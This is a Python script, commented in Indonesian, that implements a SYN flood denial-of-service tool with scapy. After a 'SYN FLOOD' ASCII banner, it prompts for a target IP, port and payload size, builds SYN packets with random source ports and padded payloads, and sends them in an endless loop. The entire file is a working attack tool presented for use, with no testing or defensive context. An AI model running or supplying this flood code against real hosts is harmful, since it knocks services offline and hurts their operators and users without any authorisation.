from scapy.all import IP, TCP, Raw, send, RandShort
import os

def syn_banner():
    RESET = '\033[0m'
    YELLOW = '\033[0;33m'

    os.system("clear")

    print("\n")

    print(f""" {YELLOW}

 ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌     ▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░▌░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌▐░▌    ▐░▌     ▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌     ▐░░░░░░░░░░░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
 ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░▌   ▐░▌ ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
          ▐░▌     ▐░▌     ▐░▌    ▐░▌▐░▌     ▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
 ▄▄▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░▌     ▐░▐░▌     ▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌     ▐░▌     ▐░▌      ▐░░▌     ▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀        ▀▀       ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
                                                                                                             

                                                                                                                           
        {RESET}""")


class FoxieSynFloodAttack:
    # Meminta input dari pengguna untuk IP target, port target, dan ukuran data
    def userinput(self):
        ip_target = input("Enter The IP Target: ").strip()  # strip digunakan utnuk menghapus spasi di awal dan akhir input
        port_target = int(input("Enter The Port Target: "))
        size = int(input("Enter The Size Of Data (bytes) ex: 1024 : ")) # mengambil input ukuran data (dalam byte) yang akan dikirimkan dalam setiap paket
        return ip_target, port_target, size

    # Mengatur paket yang akan dikirim
    def setup(self, ip_target, port_target, size):
        ip = IP(dst=ip_target) # Membuat header IP dengan dst (destination) yang ditetapkan ke alamat IP target.
        tcp = TCP(sport=RandShort(), dport=port_target, flags="S") # membuat header TCP dengan sport (source port), dport(dest port), dan flag untuk memulai 3 langkah handshake TCP
        raw = Raw(b"X" * size) # membuat payload mentah menjadi satu paket data
        data_packet = ip / tcp / raw #menggabungkan IP,TCP, dan payload mentah menjadi satu paket data
        return data_packet

    # Melakukan serangan SYN flood
    def attack(self):
        ip_target, port_target, data_size = self.userinput() 
        packet = self.setup(ip_target, port_target, data_size) # metode setup untuk membuat paket data berdasarkan input pengguna
        print(f"Starting SYN flood attack on {ip_target}:{port_target} with data size {data_size} bytes.") # menampikan pesan serangan
        send(packet, loop=1, verbose=0) # mengirim paket data dalam loop tanpa henti, dengan verbose level 0 yang artinya tidak ada output tambahan selama pengiriman

